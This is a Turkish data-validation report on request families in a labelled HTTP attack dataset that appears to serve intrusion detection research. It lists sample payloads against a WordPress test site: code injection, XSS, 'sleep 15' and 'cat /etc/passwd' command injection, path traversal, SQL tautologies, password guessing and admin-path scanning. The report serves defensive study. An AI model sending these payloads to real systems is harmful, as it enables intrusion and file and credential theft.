# Aile doğrulaması — ds_base, eşik 0.8

Her sınıftan en az 5 üyeli rastgele aileler; her aileden 3 rastgele üye. 'Yüzey' = tamamen çözülmüş saldırı yüzeyi (method+URI, standart dışı header'lar, body).

## Code Injection

Sınıfta 3051 aile; ≥5 üyeli: 198.

### Aile `8443` — 9 üye · en yaygın yol payı 22% · farklı yüzey oranı 78%

- `GET /';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='/index.php/search/device`
- `GET /';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='/index.php/search/loss`
- `GET /';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='/index.php/search`

### Aile `48050` — 12 üye · en yaygın yol payı 17% · farklı yüzey oranı 67%

- `GET /blog/index.php/'"<script>alert(1);</script>/edit-profile/{{ attachment.url ⏎ cookie: wordpress_test_cookie=WP Cookie check`
- `GET /blog/index.php/my-account/'"<script>alert(1);</script>/{{ attachment.url ⏎ cookie: wordpress_test_cookie=WP Cookie check`
- `GET /blog/index.php/my-account/'"<script>alert(1);</script>/{{ attachment.url }} ⏎ cookie: wordpress_test_cookie=WP Cookie check`

### Aile `153712` — 6 üye · en yaygın yol payı 33% · farklı yüzey oranı 50%

- `GET /';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='/wp-includes/css`
- `GET /';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='/wp-includes/js`
- `GET /';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='/wp-includes/css`

## Dictionary-based Password Attack

Sınıfta 406 aile; ≥5 üyeli: 8.

### Aile `368220` — 6 üye · en yaygın yol payı 100% · farklı yüzey oranı 100%

- `POST /wp-login.php ⏎ content-type: application/x-www-form-urlencoded ⏎ log=tomas&pwd=[Login]2019&wp-submit=Log In&redirect_to=http://test-site.com/wp-admin/&testcookie=1`
- `POST /wp-login.php ⏎ content-type: application/x-www-form-urlencoded ⏎ log=tomas&pwd=[Login]1&wp-submit=Log In&redirect_to=http://test-site.com/wp-admin/&testcookie=1`
- `POST /wp-login.php ⏎ content-type: application/x-www-form-urlencoded ⏎ log=tomas&pwd=[Login]&wp-submit=Log In&redirect_to=http://test-site.com/wp-admin/&testcookie=1`

### Aile `16383` — 5 üye · en yaygın yol payı 100% · farklı yüzey oranı 100%

- `POST /blog/wp-login.php ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=entertainment; wordpress_lo …`
- `POST /blog/wp-login.php ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=entertainment; wordpress_te …`
- `POST /blog/wp-login.php ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=entertainment; wordpress_lo …`

### Aile `368207` — 61 üye · en yaygın yol payı 100% · farklı yüzey oranı 61%

- `POST /wp-login.php ⏎ content-type: application/x-www-form-urlencoded ⏎ log=sipes-nolan&pwd=sipes-nolan123&wp-submit=Log In&redirect_to=http://test-site.com/wp-admin/&testcookie=1`
- `POST /wp-login.php ⏎ content-type: application/x-www-form-urlencoded ⏎ log=sipes-nolan&pwd=sipes-nolan*&wp-submit=Log In&redirect_to=http://test-site.com/wp-admin/&testcookie=1`
- `POST /wp-login.php ⏎ content-type: application/x-www-form-urlencoded ⏎ log=sipes-nolan&pwd=&wp-submit=Log In&redirect_to=http://test-site.com/wp-admin/&testcookie=1`

## Fake the Source of Data

Sınıfta 6167 aile; ≥5 üyeli: 395.

### Aile `204` — 407 üye · en yaygın yol payı 1% · farklı yüzey oranı 86%

- `GET /blog/http://www.google.com//category/uncategorized/page/2 ⏎ cookie: wordpress_test_cookie=WP Cookie check`
- `GET /blog/index.php/category/uncategorized/https://www.google.com:80/ ⏎ cookie: wordpress_test_cookie=WP Cookie check`
- `GET /blog/www.google.com//category/uncategorized/page/2 ⏎ cookie: wordpress_test_cookie=WP Cookie check`

### Aile `164` — 3586 üye · en yaygın yol payı 1% · farklı yüzey oranı 94%

- `GET /blog/wp-content/uploads/2020/04/www.google.com/ ⏎ cookie: wordpress_test_cookie=WP Cookie check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595192794|ac2rIDjGxLVFiHg6gbhjlqskQeNCp4jlT2Ie0y0aAac|46ce7c738987c7405e97a93bf8801872fc61acea0d2 …`
- `GET /blog/wp-content/uploads/2020/https://www.google.com/search?q=OWASP history/6b2fa1b9-c963-3881-90e3-4f13ffe1c2d3-1024x682.jpg ⏎ cookie: wordpress_test_cookie=WP Cookie check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595192794|ac2rIDjGxL …`
- `GET /blog/wp-content/uploads/2020/04/http://www.google.com:80/search?q=OWASP moment ⏎ cookie: wordpress_test_cookie=WP Cookie check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595192794|ac2rIDjGxLVFiHg6gbhjlqskQeNCp4jlT2Ie0y0aAac|46ce7c738987 …`

### Aile `28208` — 18 üye · en yaygın yol payı 100% · farklı yüzey oranı 100%

- `GET /blog/index.php/my-account/user-logout/?_wpnonce=https://www.google.com ⏎ cookie: wordpress_test_cookie=WP Cookie check`
- `GET /blog/index.php/my-account/user-logout/?_wpnonce=www.google.com:80/ ⏎ cookie: wordpress_test_cookie=WP Cookie check`
- `GET /blog/index.php/my-account/user-logout/?_wpnonce=HTTP://www.google.com:80/search?q=OWASP language ⏎ cookie: wordpress_test_cookie=WP Cookie check`

## HTTP Response Splitting

Sınıfta 4002 aile; ≥5 üyeli: 239.

### Aile `155623` — 5 üye · en yaygın yol payı 40% · farklı yüzey oranı 80%

- `GET /blog ⏎ sleep 15 ⏎ `
- `GET /blog ⏎ sleep 15 ⏎ /xmlrpc.php`
- `GET /blog ⏎ sleep 15 ⏎ `

### Aile `47` — 6 üye · en yaygın yol payı 17% · farklı yüzey oranı 100%

- `GET /any? ⏎ Set-cookie: Tamper=7ac22b60-cddd-4287-a668-e8410a5b0416/wp-content/plugins/user-registration/assets/js/frontend/jquery.validate.min.js?ver=1.15.1`
- `GET /any ⏎ Set-cookie: Tamper=7ac22b60-cddd-4287-a668-e8410a5b0416/wp-content/plugins/user-registration/assets/js/frontend/jquery.validate.min.js?ver=1.15.1`
- `GET /any ⏎ Set-cookie: Tamper=7ac22b60-cddd-4287-a668-e8410a5b0416 ⏎ /wp-content/plugins/user-registration/assets/js/frontend/jquery.validate.min.js?ver=1.15.1`

### Aile `212023` — 6 üye · en yaygın yol payı 17% · farklı yüzey oranı 100%

- `GET /blog/any? ⏎ Set-cookie: Tamper=45aa8dfe-a780-4f70-9416-1a677758f05e/uploads/2020/04/ff237aac-eda3-37f9-8529-2cbfc90951b2-1024x682.jpg ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd7 …`
- `GET /blog/any ⏎ Set-cookie: Tamper=e8908338-9722-4d2d-8409-8e05382b6e9a ⏎ /uploads/2020/04/6e5c5163-fca7-365f-898b-acced7ed5063-300x240.png ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd …`
- `GET /blog/any? ⏎ Set-cookie: Tamper=6f1b691a-1b1f-4d05-8c9d-c184b91967a2/porro-corrupti-cupiditate-neque-fugit-aperiam-exercitationem ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e …`

## HTTP Verb Tampering

Sınıfta 850 aile; ≥5 üyeli: 61.

### Aile `367513` — 20 üye · en yaygın yol payı 5% · farklı yüzey oranı 100%

- `PROPFIND /blog/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4 ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpr …`
- `PROPFIND /blog/wp-includes/js/jquery/ui/sortable.min.js?ver=1.11.4 ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wo …`
- `PROPFIND /blog/wp-includes/js/imgareaselect/imgareaselect.css?ver=0.9.8 ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a365 …`

### Aile `224` — 9 üye · en yaygın yol payı 89% · farklı yüzey oranı 100%

- `UNLOCK /blog/wp-includes/js/wp-util.min.js?ver=4.9.5 ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpress_test_c …`
- `PROPPATCH /blog/wp-includes/js/wp-util.min.js?ver=4.9.5 ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpress_tes …`
- `COPY /blog/wp-includes/js/wp-util.min.js?ver=4.9.5 ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpress_test_coo …`

### Aile `257` — 8 üye · en yaygın yol payı 100% · farklı yüzey oranı 100%

- `MKCOL /blog/index.php/my-account/lost-password/ ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpress_test_cookie …`
- `UNLOCK /blog/index.php/my-account/lost-password/ ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpress_test_cooki …`
- `TRACK /blog/index.php/my-account/lost-password/ ⏎ cookie: fiJcK5DvEjltIGL=obxSDUXIkn7O6rQ7FC5jHT3IHrNgsUFeEKDTBWMo; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083 …`

## Input Data Manipulation

Sınıfta 747 aile; ≥5 üyeli: 19.

### Aile `214085` — 5 üye · en yaygın yol payı 100% · farklı yüzey oranı 60%

- `POST /blog/wp-comments-post.php ⏎ cookie: Tamper=ada5948b-2d75-461d-82a7-52b5346e13b6 ⏎ content-type: Set-cookie: Tamper=ada5948b-2d75-461d-82a7-52b5346e13b6 ⏎ comment=&submit=Post Comment&comment_post_ID=56&comment_parent=0`
- `POST /blog/wp-comments-post.php ⏎ cookie: Tamper=ada5948b-2d75-461d-82a7-52b5346e13b6 ⏎ content-type: any? ⏎ comment=&submit=Post Comment&comment_post_ID=56&comment_parent=0`
- `POST /blog/wp-comments-post.php ⏎ cookie: Tamper=ada5948b-2d75-461d-82a7-52b5346e13b6 ⏎ content-type: any? ⏎ comment=&submit=Post Comment&comment_post_ID=56&comment_parent=0`

### Aile `8695` — 5 üye · en yaygın yol payı 20% · farklı yüzey oranı 100%

- `POST /blog/index.php/my-account/ ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; wordpress_test_cookie=WP Cookie check; comment_author_1aefbe2f76ed …`
- `POST /blog/wp-login.php?action=register ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=description …`
- `POST /blog/index.php/my-account/edit-profile/post.php/?action=edit&post={{ data.id }} ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; wordpress_tes …`

### Aile `8084` — 43 üye · en yaygın yol payı 100% · farklı yüzey oranı 100%

- `POST /blog/index.php/registration/ ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; wordpress_test_cookie=WP Cookie check; comment_author_1aefbe2f76 …`
- `POST /blog/index.php/registration/ ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; wordpress_test_cookie=WP Cookie check; comment_author_1aefbe2f76 …`
- `POST /blog/index.php/registration/ ⏎ cookie: wordpress_test_cookie=WP Cookie check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595192794|ac2rIDjGxLVFiHg6gbhjlqskQeNCp4jlT2Ie0y0aAac|46ce7c738987c7405e97a93bf8801872fc61acea0d217d2ba547814ea71cc …`

## Normal

Sınıfta 14431 aile; ≥5 üyeli: 814.

### Aile `363358` — 5 üye · en yaygın yol payı 100% · farklı yüzey oranı 100%

- `TRACE /blog/wp-content/plugins/user-registration/assets/js/frontend/jquery.validate.min.js?ver=1.15.1 ⏎ cookie: VdkJ6PWvQcC0cJS=rRc2GlFg1huq7CdVvHoENFyP3XXCFLy18Eg8Y37c; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpx …`
- `TRACE /blog/wp-content/plugins/user-registration/assets/js/frontend/jquery.validate.min.js?ver=1.15.1 ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091 …`
- `TRACE /blog/wp-content/plugins/user-registration/assets/js/frontend/jquery.validate.min.js?ver=1.15.1 ⏎ cookie: UnB0W0VG3KI2dWj=ChLHfGTyeW6uN3fPgaX4uuEZOQWjlGH5zzGwPRwR; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpx …`

### Aile `14148` — 16 üye · en yaygın yol payı 12% · farklı yüzey oranı 88%

- `GET / /wp-includes/js/mediaelement/mediaelement-migrate.min.js?ver=4.9.5`
- `GET /URL='http://8501779237819759495.owasp.org'/wp-includes/js/mediaelement/mediaelement-migrate.min.js?ver=4.9.5`
- `GET //wp-includes/js/mediaelement/mediaelement-migrate.min.js?ver=4.9.5`

### Aile `3420` — 9 üye · en yaygın yol payı 22% · farklı yüzey oranı 56%

- `GET //index.php ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595186814|JXKR2dCAupLoAglXHclubbgwQJ4BL3zNKjxcob6dgUn|fd5bc3380dc730cacaf855e46730c46b2fa753b2bb8d9f1096c95b5b8090acb3`
- `GET ///index.php ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595186814|JXKR2dCAupLoAglXHclubbgwQJ4BL3zNKjxcob6dgUn|fd5bc3380dc730cacaf855e46730c46b2fa753b2bb8d9f1096c95b5b8090acb3`
- `GET /c://index.php ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595186814|JXKR2dCAupLoAglXHclubbgwQJ4BL3zNKjxcob6dgUn|fd5bc3380dc730cacaf855e46730c46b2fa753b2bb8d9f1096c95b5b8090acb3`

## OS Command Injection

Sınıfta 2325 aile; ≥5 üyeli: 74.

### Aile `15190` — 12 üye · en yaygın yol payı 100% · farklı yüzey oranı 100%

- `POST /blog/wp-login.php?action=lostpassword ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595188528|lHi7YVFypQtuJVAqG6B4FOpzZ24r5fr11PP0w4JBwKX|05eff642e7638456de705bca89de40119bc343cb09e3b0c57372fe30717543b0; wordpress_test_cookie=WP  …`
- `POST /blog/wp-login.php?action=lostpassword ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595188528|lHi7YVFypQtuJVAqG6B4FOpzZ24r5fr11PP0w4JBwKX|05eff642e7638456de705bca89de40119bc343cb09e3b0c57372fe30717543b0; wordpress_test_cookie=WP  …`
- `POST /blog/wp-login.php?action=lostpassword ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595188528|lHi7YVFypQtuJVAqG6B4FOpzZ24r5fr11PP0w4JBwKX|05eff642e7638456de705bca89de40119bc343cb09e3b0c57372fe30717543b0; wordpress_test_cookie=WP  …`

### Aile `155637` — 19 üye · en yaygın yol payı 21% · farklı yüzey oranı 100%

- `GET /blog/?s=activity ⏎ cat /etc/passwd ⏎  ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=painting …`
- `GET /blog/index.php/my-account/edit-profile/?mode=grid&cat /etc/passwd& ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; comment_author_1aefbe2f76ed …`
- `GET /blog/index.php/page/2/?s=||cat /etc/passwd ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=con …`

### Aile `352449` — 9 üye · en yaygın yol payı 56% · farklı yüzey oranı 100%

- `POST /blog/index.php/my-account/ ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpress_test_cookie=WP Cookie chec …`
- `POST /blog/index.php/my-account/ ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpress_test_cookie=WP Cookie chec …`
- `POST /blog/index.php/my-account/ ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpress_test_cookie=WP Cookie chec …`

## Path Traversal

Sınıfta 1052 aile; ≥5 üyeli: 195.

### Aile `8854` — 20 üye · en yaygın yol payı 10% · farklı yüzey oranı 50%

- `GET /\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\/index.php/tag/autem-vel-nostrum-enim`
- `GET /\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\/index.php/tag/nobis-perspiciatis-optio`
- `GET /\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\/index.php/tag/hic-quod-et-odit`

### Aile `4623` — 6 üye · en yaygın yol payı 33% · farklı yüzey oranı 67%

- `GET //../../../../../../../../../../../../../../../../etc/passwd/index.php/author/sipes-nolan`
- `GET //../../../../../../../../../../../../../../../../etc/passwd/index.php/author/sipes-nolan`
- `GET /../../../../../../../../../../../../../../../../etc/passwd/index.php/author/sipes-nolan/feed`

### Aile `13396` — 8 üye · en yaygın yol payı 25% · farklı yüzey oranı 50%

- `GET /blog/../../../../../../../../../../../../../../../..//js/jquery/ui ⏎ cookie: wordpress_test_cookie=WP Cookie check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595188528|lHi7YVFypQtuJVAqG6B4FOpzZ24r5fr11PP0w4JBwKX|05eff642e7638456de705bca …`
- `GET /blog/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\/js/jquery/ui ⏎ cookie: wordpress_test_cookie=WP Cookie check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595188528|lHi7YVFypQtuJVAqG6B4FOpzZ24r5fr11PP0w4JBwKX|05eff642e7638456de705bca …`
- `GET /blog/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\/js/jquery/ui ⏎ cookie: wordpress_test_cookie=WP Cookie check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595188528|lHi7YVFypQtuJVAqG6B4FOpzZ24r5fr11PP0w4JBwKX|05eff642e7638456de705bca …`

## Protocol Manipulation

Sınıfta 1822 aile; ≥5 üyeli: 128.

### Aile `356397` — 5 üye · en yaygın yol payı 20% · farklı yüzey oranı 100%

- `GET /blog/wp-admin.old ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpress_test_cookie=WP Cookie check`
- `GET /blog/wp-admin.swp ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpress_test_cookie=WP Cookie check`
- `GET /blog/wp-admin.bak ⏎ cookie: wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael|1595323524|6tC0Bz0qiJuGChXpFpxWSj0f3S8yenNYTdZsIhm2LRR|babde797833e7bb3ef2675427c083c091406c9fd8627fefa2d894bad550a3656; wordpress_test_cookie=WP Cookie check`

### Aile `351087` — 5 üye · en yaygın yol payı 40% · farklı yüzey oranı 60%

- `GET /icons' AND '1'='2' -- `
- `GET /icons' AND '1'='2' -- `
- `GET /icons' OR '1'='1' -- `

### Aile `133264` — 7 üye · en yaygın yol payı 100% · farklı yüzey oranı 100%

- `GET /blog/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4 ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; comment_author_1aefbe2f76edd740f8e362f3 …`
- `GET /blog/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4 ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; comment_author_1aefbe2f76edd740f8e362f3 …`
- `GET /blog/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4 ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; comment_author_1aefbe2f76edd740f8e362f3 …`

## SQL Injection

Sınıfta 36478 aile; ≥5 üyeli: 1193.

### Aile `127719` — 21 üye · en yaygın yol payı 5% · farklı yüzey oranı 100%

- `GET /blog/wp-includes/css/wp-embed-template-ie.min.css?ver=4.9.5 ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; wordpress_test_cookie=WP Cookie ch …`
- `GET /blog/wp-includes/js/wp-backbone.min.js?ver=4.9.5 ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; wordpress_test_cookie=WP Cookie check; commen …`
- `GET /blog/wp-includes/js";sleep 15;"/json2.min.js?ver=2015-05-03 ⏎ cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http://www.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar@example.com; comment_author_1aefbe2f76edd740f8e …`

### Aile `167101` — 12 üye · en yaygın yol payı 17% · farklı yüzey oranı 50%

- `GET /blog";sleep 15;"/index.php/wp-json/oembed`
- `GET /blog"&sleep 15&"/index.php/wp-json/oembed`
- `GET /blog";sleep 15;"/index.php/wp-json/oembed`

### Aile `171151` — 36 üye · en yaygın yol payı 6% · farklı yüzey oranı 72%

- `GET /blog&&sleep 15/wp-content/themes/twentyseventeen/assets`
- `GET /blog||sleep 15/wp-content/themes/twentyseventeen/assets/js/html5.js?ver=3.7.3`
- `GET /blog&&sleep 15/wp-content/themes/twentyseventeen`

## Scanning for Vulnerable Software

Sınıfta 1860 aile; ≥5 üyeli: 40.

### Aile `1066` — 6 üye · en yaygın yol payı 17% · farklı yüzey oranı 100%

- `HEAD /administrator/account.php`
- `HEAD /administrator/account.html`
- `HEAD /administrator/account.cfm`

### Aile `1111` — 6 üye · en yaygın yol payı 17% · farklı yüzey oranı 100%

- `HEAD /panel-administracion/admin.cfm`
- `HEAD /panel-administracion/admin.html`
- `HEAD /panel-administracion/admin.jsp`

### Aile `1011` — 13 üye · en yaygın yol payı 15% · farklı yüzey oranı 100%

- `HEAD /administrators/`
- `HEAD /administrator/`
- `HEAD /administr8.asp`

## Özet

| Sınıf | Aile boyutu | En yaygın yol payı | Farklı yüzey oranı |
|---|---:|---:|---:|
| Code Injection | 9 | 22% | 78% |
| Code Injection | 12 | 17% | 67% |
| Code Injection | 6 | 33% | 50% |
| Dictionary-based Password Attack | 6 | 100% | 100% |
| Dictionary-based Password Attack | 5 | 100% | 100% |
| Dictionary-based Password Attack | 61 | 100% | 61% |
| Fake the Source of Data | 407 | 1% | 86% |
| Fake the Source of Data | 3586 | 1% | 94% |
| Fake the Source of Data | 18 | 100% | 100% |
| HTTP Response Splitting | 5 | 40% | 80% |
| HTTP Response Splitting | 6 | 17% | 100% |
| HTTP Response Splitting | 6 | 17% | 100% |
| HTTP Verb Tampering | 20 | 5% | 100% |
| HTTP Verb Tampering | 9 | 89% | 100% |
| HTTP Verb Tampering | 8 | 100% | 100% |
| Input Data Manipulation | 5 | 100% | 60% |
| Input Data Manipulation | 5 | 20% | 100% |
| Input Data Manipulation | 43 | 100% | 100% |
| Normal | 5 | 100% | 100% |
| Normal | 16 | 12% | 88% |
| Normal | 9 | 22% | 56% |
| OS Command Injection | 12 | 100% | 100% |
| OS Command Injection | 19 | 21% | 100% |
| OS Command Injection | 9 | 56% | 100% |
| Path Traversal | 20 | 10% | 50% |
| Path Traversal | 6 | 33% | 67% |
| Path Traversal | 8 | 25% | 50% |
| Protocol Manipulation | 5 | 20% | 100% |
| Protocol Manipulation | 5 | 40% | 60% |
| Protocol Manipulation | 7 | 100% | 100% |
| SQL Injection | 21 | 5% | 100% |
| SQL Injection | 12 | 17% | 50% |
| SQL Injection | 36 | 6% | 72% |
| Scanning for Vulnerable Software | 6 | 17% | 100% |
| Scanning for Vulnerable Software | 6 | 17% | 100% |
| Scanning for Vulnerable Software | 13 | 15% | 100% |
